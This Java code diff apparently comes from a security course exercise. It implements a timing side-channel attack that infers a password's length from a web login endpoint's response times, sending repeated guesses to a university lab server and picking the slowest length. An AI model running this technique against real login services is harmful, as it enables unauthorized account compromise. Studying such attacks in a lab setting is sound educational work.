@@ -11,7 +11,7 @@ public class ex01_M1 {
 
     public static int MIN_PASSWORD_LENGTH = 1;
     public static int MAX_PASSWORD_LENGTH = 16;
-    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 150;
+    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 30;
     public static int FOUND_THE_PASSWORD = -1;
     public static int ERROR_WHILE_CHECK_TIME = 0;
 
@@ -32,6 +32,7 @@ public class ex01_M1 {
             end = getCurrentTime();
             String body = new String(conn.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
             if("1".equals(body)){
+                System.out.println(url);
                 return FOUND_THE_PASSWORD;
             }
 
@@ -53,7 +54,7 @@ public class ex01_M1 {
         {
             passwordLengthToSumTime.put(i, (long) 0);
             passwordLengthAttempts.put(i, 0);
-            passwordStrings.put(i, String.format(url, new String(new char[6]).replace("\0", "a")));
+            passwordStrings.put(i, String.format(url, new String(new char[i]).replace("\0", "a")));
         }
 
         long responseTime;
@@ -69,19 +70,25 @@ public class ex01_M1 {
                 responseTime = checkResponseTime(passwordStrings.get(passwordLength));
                 if (responseTime != ERROR_WHILE_CHECK_TIME && responseTime != FOUND_THE_PASSWORD)
                 {
-                    //System.out.println(responseTime);
                     passwordLengthToSumTime.put(passwordLength, responseTime + passwordLengthToSumTime.get(passwordLength));
                     passwordLengthAttempts.put(passwordLength, passwordLengthAttempts.get(passwordLength) + 1);
                 }
             }
         }
 
-        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
-        {
-            System.out.println(String.format("Length %d took %d", i, passwordLengthToSumTime.get(i) / passwordLengthAttempts.get(i)));
+        int maxAveragePasswordLength = MIN_PASSWORD_LENGTH;
+        long maxAverage = passwordLengthToSumTime.get(MIN_PASSWORD_LENGTH) / passwordLengthAttempts.get(MIN_PASSWORD_LENGTH);
+        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++) {
+            long currentAverage = passwordLengthToSumTime.get(i) / passwordLengthAttempts.get(i);
+            System.out.println(String.format("Length %d took %d", i, currentAverage));
+            if (currentAverage > maxAverage)
+            {
+                maxAveragePasswordLength = i;
+                maxAverage = currentAverage;
+            }
         }
 
-        return 0;
+        return maxAveragePasswordLength;
     }
 
     public static void main(String[] args) {
@@ -90,6 +97,10 @@ public class ex01_M1 {
             System.exit(0);
         }
 
-        checkPasswordLength("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1");
+        // first call to do some setup in java:
+        checkResponseTime("http://aoi.ise.bgu.ac.il/?user=ID&password=1234&difficulty=1");
+
+        int passwordLength = checkPasswordLength("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1");
+        System.out.println(String.format("Password length is %d", passwordLength));
     }
 }
